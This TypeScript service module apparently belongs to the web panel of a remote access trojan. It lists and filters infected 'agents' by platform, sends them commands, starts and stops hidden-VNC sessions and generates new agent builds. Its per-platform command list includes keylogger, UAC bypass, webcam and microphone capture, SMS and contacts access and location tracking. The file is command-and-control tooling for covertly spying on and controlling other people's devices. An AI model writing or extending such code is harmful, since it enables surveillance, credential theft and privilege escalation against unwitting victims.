import request from '../axios';
import { Agent } from '../types';

export interface CommandResponse {
  success: boolean;
  message: string;
  data?: any;
}

const API_URL = '/agent';

export const agentService = {
  // Get all agents with optional filters
  async getAgents(filters?: { status?: string; platform?: string }): Promise<Agent[]> {
    let url = API_URL;
    if (filters) {
      const params = new URLSearchParams();
      if (filters.status) params.append('status', filters.status);
      if (filters.platform) params.append('platform', filters.platform);
      url += `?${params.toString()}`;
    }
    
    const response = await request({ url, method: 'GET' });
    return response.data.data.agents;
  },

  // Get a specific agent by ID
  async getAgent(id: string): Promise<Agent> {
    const response = await request({ url: `${API_URL}/${id}`, method: 'GET' });
    return response.data.data.agent;
  },

  // Send a command to an agent
  async sendCommand(agentId: string, command: string, params?: any): Promise<CommandResponse> {
    const response = await request({ 
      url: `${API_URL}/${agentId}/command`, 
      method: 'POST',
      data: { command, params }
    });
    return response.data;
  },

  // Start HVNC session
  async startHvncSession(agentId: string, options?: any): Promise<CommandResponse> {
    const response = await request({ 
      url: `${API_URL}/${agentId}/hvnc/start`, 
      method: 'POST',
      data: options || {}
    });
    return response.data;
  },

  // Stop HVNC session
  async stopHvncSession(agentId: string): Promise<CommandResponse> {
    const response = await request({ 
      url: `${API_URL}/${agentId}/hvnc/stop`, 
      method: 'POST'
    });
    return response.data;
  },

  // Generate new agent
  async generateAgent(config: any): Promise<any> {
    const response = await request({ 
      url: `${API_URL}/generate-agent`, 
      method: 'POST',
      data: config
    });
    return response.data;
  },

  // Get platform-specific commands
  getPlatformCommands(platform: 'windows' | 'mac' | 'android'): string[] {
    const commonCommands = ['capture-screen', 'file-manager'];
    
    switch (platform) {
      case 'windows':
        return [...commonCommands, 'keylogger', 'process-manager', 'registry-editor', 'uac-bypass'];
      case 'mac':
        return [...commonCommands, 'keylogger', 'process-manager', 'webcam-capture', 'microphone-capture'];
      case 'android':
        return [...commonCommands, 'sms-manager', 'contacts-manager', 'location-tracker', 'app-manager'];
      default:
        return commonCommands;
    }
  }
};

export default agentService;